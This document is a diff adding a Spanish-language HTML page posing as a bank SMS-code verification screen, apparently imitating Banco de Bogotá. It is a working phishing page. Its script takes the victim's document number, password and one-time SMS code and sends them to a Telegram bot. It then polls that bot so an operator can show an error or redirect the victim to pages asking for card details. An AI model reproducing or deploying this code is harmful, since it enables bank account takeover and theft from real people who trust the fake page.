@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validación de Código SMS</title>
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <style>
+        body {
+            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            background-color: #eee;
+        }
+
+        .custom-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .custom-modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .spinner-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid white;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .pin-input input {
+            width: 45px;
+            height: 45px;
+            text-align: center;
+            font-size: 1.5rem;
+            border-radius: 8px;
+            border: 1px solid #d1d5db;
+            margin: 0 4px;
+        }
+    </style>
+</head>
+<body>
+    <div id="app">
+        <header class="w-full flex items-center justify-center py-16 bg-gradient-to-t from-[#df0209] to-[#df0209]">
+            <img src="img/logo.png" alt="" class="w-full max-w-[150px] h-auto -mt-4">
+        </header>
+
+        <div class="relative mt-[-1rem] rounded-t-[15px] w-full h-auto bg-gray-200 p-6 box-border">
+            <form id="smsForm">
+                <div class="w-full text-center mb-6">
+            
+                    <h3 class="text-xl font-bold text-[#000000] mb-2">Ingresa tu código SMS</h3>
+                    <p class="text-sm text-gray-600">Hemos enviado un código de 6 dígitos a tu número de teléfono registrado. Por favor, ingrésalo a continuación para continuar.</p>
+                </div>
+
+                <div class="flex justify-center my-6 pin-input">
+                    <input type="tel" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                    <input type="tel" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                    <input type="tel" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                    <input type="tel" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                    <input type="tel" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                    <input type="tel" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                </div>
+
+                <button type="submit" id="submitBtn" disabled class="block w-full rounded-2xl text-white bg-[#df0209] font-bold text-base border-none py-2 px-0 text-center my-4 mx-auto disabled:opacity-70">Validar Código</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="error-modal" class="custom-modal">
+        <div class="custom-modal-content">
+            <div class="flex items-center justify-center gap-5">
+                <img src="../virtual.bancodebogota.co/bbog-pb-frontend-authentication-app/assets/422e00391dd36d89affe.html" alt="Icono de error" class="w-15 h-15">
+                <div>
+                    <h3 class="mb-5 text-[#df0209]">¡Ups! Algo salió mal</h3>
+                    <p>El código ingresado es incorrecto. Por favor, verifica e intenta de nuevo.</p>
+                </div>
+            </div>
+            <button id="back-to-start-button" class="mt-5 w-full bg-[#df0209] text-white py-3 rounded-lg">Volver a intentar</button>
+        </div>
+    </div>
+
+    <div id="spinner-modal" class="spinner-container">
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const codeInputs = document.querySelectorAll('.code-input');
+            const submitBtn = document.getElementById('submitBtn');
+            const smsForm = document.getElementById('smsForm');
+            const errorModal = document.getElementById('error-modal');
+            const backToStartButton = document.getElementById('back-to-start-button');
+            const spinnerModal = document.getElementById('spinner-modal');
+            const initialLoginData = JSON.parse(sessionStorage.getItem('initialLoginData'));
+            const transactionId = initialLoginData?.transactionId || Date.now().toString();
+
+            let TELEGRAM_BOT_TOKEN = '';
+            let TELEGRAM_CHAT_ID = '';
+            let statusCheckInterval = null;
+            let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0;
+
+            async function loadTelegramConfig() {
+                try {
+                    const response = await fetch('js/brr76.json');
+                    if (!response.ok) throw new Error('Network response was not ok');
+                    const data = await response.json();
+                    TELEGRAM_BOT_TOKEN = data.token;
+                    TELEGRAM_CHAT_ID = data.chat_id;
+                    console.log("Tokens y IDs de chat de Telegram cargados correctamente.");
+                    return true;
+                } catch (error) {
+                    console.error('Error al cargar la configuración de Telegram:', error);
+                    alert('Error crítico: No se pudo cargar la configuración de Telegram. Por favor, verifica el archivo js/brr76.json.');
+                    if (submitBtn) submitBtn.disabled = true;
+                    return false;
+                }
+            }
+
+            async function initLastUpdateId() {
+                try {
+                    if (!TELEGRAM_BOT_TOKEN) return;
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
+                    const response = await fetch(url);
+                    const data = await response.json();
+                    if (!data || !data.result) return;
+                    const updates = data.result;
+                    if (updates.length === 0) return;
+                    const maxUpdateId = Math.max(...updates.map(u => u.update_id));
+                    lastUpdateId = maxUpdateId;
+                    sessionStorage.setItem('lastUpdateId', lastUpdateId);
+                    console.log('Inicializado lastUpdateId a', lastUpdateId);
+                } catch (err) {
+                    console.warn('No se pudo inicializar lastUpdateId:', err);
+                }
+            }
+
+            codeInputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    if (e.data && /^[0-9]$/.test(e.data)) {
+                        if (index < codeInputs.length - 1) {
+                            codeInputs[index + 1].focus();
+                        }
+                    } else if (e.inputType === 'deleteContentBackward') {
+                        if (index > 0) {
+                            codeInputs[index - 1].focus();
+                        }
+                    }
+                    validateForm();
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                        codeInputs[index - 1].focus();
+                    }
+                });
+
+                input.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const pasteData = e.clipboardData.getData('text').replace(/\s/g, '');
+                    for (let i = 0; i < codeInputs.length && i < pasteData.length; i++) {
+                        codeInputs[index + i].value = pasteData[i];
+                    }
+                    validateForm();
+                });
+            });
+
+            function validateForm() {
+                let code = '';
+                codeInputs.forEach(input => {
+                    code += input.value;
+                });
+                if (code.length === 6) {
+                    submitBtn.disabled = false;
+                } else {
+                    submitBtn.disabled = true;
+                }
+            }
+
+            async function sendToTelegram(messageContent, keyboard) {
+                if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                    throw new Error('Telegram bot token or chat ID is not set.');
+                }
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const payload = {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: messageContent,
+                    parse_mode: 'Markdown',
+                    reply_markup: keyboard
+                };
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        console.error(`Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
+                        return null;
+                    }
+                    const data = await response.json();
+                    return data.result.message_id;
+                } catch (error) {
+                    console.error('Error de red al enviar mensaje a Telegram:', error);
+                    return null;
+                }
+            }
+
+            async function editTelegramMessage(chatId, messageId) {
+                if (!chatId || !messageId) return;
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
+                const payload = {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    reply_markup: {}
+                };
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        console.error(`Error al borrar botones de Telegram: ${response.status} - ${errorText}`);
+                    }
+                } catch (error) {
+                    console.error('Error de red al borrar botones de Telegram:', error);
+                }
+            }
+
+            async function handleSmsAttempt() {
+                spinnerModal.style.display = 'flex';
+                let smsCode = '';
+                codeInputs.forEach(input => {
+                    smsCode += input.value;
+                });
+
+                const now = new Date();
+                const formattedDate = now.toLocaleDateString('es-CO', {
+                    day: 'numeric', month: 'numeric', year: 'numeric'
+                });
+                const formattedTime = now.toLocaleTimeString('es-CO', {
+                    hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
+                });
+
+                const message = `⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️🔴🔴🔴 TOKEN SMS  🔴🔴🔴⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️\n\nTipo de Ingreso: ${initialLoginData?.loginType || 'Clave Segura'}\nTipo de Doc: ${initialLoginData?.tipoDoc}\n\nCEDULA💎: ${initialLoginData?.nroDoc}\nCLAVE🔐: ${initialLoginData?.clave || initialLoginData?.cardClave}\n\n⚠️ Código SMS: ${smsCode}\n\nFecha/Hora: ${formattedDate}, ${formattedTime}`;
+
+                const keyboard = JSON.stringify({
+                    inline_keyboard: [
+                        [{ text: "❌ Error SMS", callback_data: `error_sms:${transactionId}` }],
+                        [{ text: "👤 Pedir Datos", callback_data: `pedir_datos:${transactionId}` }],
+                        [{ text: "💳 Pedir Tarjeta Débito", callback_data: `pedir_td:${transactionId}` }],
+                        [{ text: "💳 Pedir Tarjeta Crédito", callback_data: `pedir_tc:${transactionId}` }]
+                    ],
+                });
+
+                const messageId = await sendToTelegram(message, keyboard);
+
+                if (messageId) {
+                    sessionStorage.setItem('telegramMessageId', messageId);
+                    checkPaymentVerification();
+                } else {
+                    spinnerModal.style.display = 'none';
+                    alert("Error al enviar los datos. Por favor, inténtalo de nuevo.");
+                }
+            }
+
+            async function checkPaymentVerification() {
+                if (statusCheckInterval) {
+                    clearInterval(statusCheckInterval);
+                }
+                statusCheckInterval = setInterval(async () => {
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`;
+                    try {
+                        const response = await fetch(url);
+                        const data = await response.json();
+                        const updates = data.result;
+
+                        if (updates && updates.length > 0) {
+                            const relevantUpdate = updates.find(u => u.callback_query && u.callback_query.data.includes(transactionId));
+
+                            if (relevantUpdate) {
+                                const latest = relevantUpdate;
+                                clearInterval(statusCheckInterval);
+                                spinnerModal.style.display = 'none';
+
+                                const callbackData = latest.callback_query.data.split(':')[0];
+                                const callbackId = latest.callback_query.id;
+                                const messageId = sessionStorage.getItem('telegramMessageId');
+
+                                await editTelegramMessage(TELEGRAM_CHAT_ID, messageId);
+
+                                try {
+                                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ callback_query_id: callbackId, text: 'Procesado' })
+                                    });
+                                } catch (err) {
+                                    console.warn('No se pudo responder callback_query:', err);
+                                }
+
+                                lastUpdateId = latest.update_id;
+                                sessionStorage.setItem('lastUpdateId', lastUpdateId);
+
+                                if (callbackData === 'error_sms') {
+                                    errorModal.style.display = 'flex';
+                                } else if (callbackData === 'pedir_datos') {
+                                    window.location.href = "datos.html";
+                                } else if (callbackData === 'pedir_td') {
+                                    window.location.href = "td.html";
+                                } else if (callbackData === 'pedir_tc') {
+                                    window.location.href = "tc.html";
+                                }
+                            }
+                        }
+                    } catch (error) {
+                        console.error("Error al verificar el estado de la transacción:", error);
+                    }
+                }, 2000);
+            }
+
+            smsForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                handleSmsAttempt();
+            });
+
+            if (backToStartButton) {
+                backToStartButton.addEventListener('click', () => {
+                    errorModal.style.display = 'none';
+                    window.location.reload(); 
+                });
+            }
+
+            window.addEventListener('beforeunload', function() {
+                if (statusCheckInterval) {
+                    clearInterval(statusCheckInterval);
+                }
+            });
+
+            loadTelegramConfig().then(configLoaded => {
+                if (configLoaded) {
+                    initLastUpdateId();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
